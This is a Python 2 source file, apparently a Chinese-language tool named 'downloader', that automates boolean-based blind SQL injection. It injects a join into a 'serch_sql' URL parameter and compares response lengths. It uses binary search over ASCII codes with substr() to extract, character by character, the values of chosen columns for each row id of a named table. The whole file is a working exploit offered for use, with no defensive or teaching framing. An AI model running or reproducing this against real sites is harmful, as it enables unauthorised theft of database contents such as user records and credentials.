# coding:utf-8
'''
    下载器
'''
import urllib2
from urllib import urlencode
class Downloader(object):
    
    # urlib2
    def get_url(self,url):
        request = urllib2.Request(url)
        request.add_header("user-agent", "Mozilla/5.0")
        response = urllib2.urlopen(url)
        if response.getcode() != 200 :
            print "ip is wrong , please input an ip again."
            return 0
        return response
    
    # 拼接url下载并判断正确数据
    def get_html(self,base_url,tablename,columns):
        root_url = base_url + "&serch_sql=as%20a%20join%20"+tablename
        
        datas = {}
        try:
            # 计算页面不正常显示时候的长度
            no_url = root_url + "%20as%20b%20where%20if(0,1,0)%20limit%200,1--%20sd"
            
            no_response = self.get_url(no_url)
            wrongcode = len(no_response.read())
            
            # 开始抓
            # 所有字段数组
            column_arr = columns.split(',')
            # id 循环
            id = 1
            id_flag = 0
            id_lianxu_flag = 0
            while id_flag <= 10:
                column_data = {}
                # 判断这个id是否存在 
                id_url = root_url + "%20as%20b%20where%20if(1,1,0)%20and%20b.id="+str(id)+"%20limit%200,1--%20sd"
                id_response = self.get_url(id_url)
                idcode = len(id_response.read())
                if idcode == wrongcode :
                    if id_lianxu_flag == 1:
                        id_flag = id_flag + 1
                        id_lianxu_flag = 1
                    else:
                        id_flag = 1
                        id_lianxu_flag = 1
                    continue
                
                id_lianxu_flag = 0
                id_flag = 0
                
                # 如果这个id存在，开始循环字段
                for column in column_arr:
    
                    # 开始字符循环
                    a_char = 1
                    endascci = ""
                    while 1:
                        # 开始循环ascci码
                        a_ascci = 0
                        # 二分法优化
                        low = 1
                        height = 127
                        while low < height:
                            ascci = (low+height)/2
                            url = root_url + "%20as%20b%20where%20if(ascii(substr(b."+column + ","+str(a_char)+ ",1))>" + str(ascci)+",1,0)%20and%20b.id="+str(id)+"%20limit%200,1--%20sd"
                            response = self.get_url(url)
                            url = ""
                            urlcode = len(response.read())
                            if urlcode > wrongcode:
                                low = ascci
                                if (height-low+1) <=3:
                                    for ascci in range(low,height+1,1):
                                        url = root_url + "%20as%20b%20where%20if(ascii(substr(b."+column + ","+str(a_char)+ ",1))=" + str(ascci)+",1,0)%20and%20b.id="+str(id)+"%20limit%200,1--%20sd"
                                        response = self.get_url(url)
                                        url = ""
                                        if len(response.read()) > wrongcode:
                                            a_ascci = ascci
                                            endascci = endascci + chr(ascci)
                                            low = height =0
                                            a_char = a_char + 1 
                                            break
                            else:
                                height = ascci
                                if (height-low+1) <=3:
                                    for ascci in range(low,height+1,1):
                                        url = root_url + "%20as%20b%20where%20if(ascii(substr(b."+column + ","+str(a_char)+ ",1))=" + str(ascci)+",1,0)%20and%20b.id="+str(id)+"%20limit%200,1--%20sd"
                                        response = self.get_url(url)
                                        url = ""
                                        if len(response.read()) > wrongcode:
                                            a_ascci = ascci
                                            endascci = endascci + chr(ascci)
                                            low = height = 0
                                            a_char = a_char + 1 
                                            break
                        if a_ascci == 0:
                            break
                    column_data[ column] = endascci 
                datas[ id] = column_data 
                print column_data
                id = id + 1
        except:
            print "Maybe get some datas is not succesful"
            return datas
        # 返回结果
        return datas
        
    
    



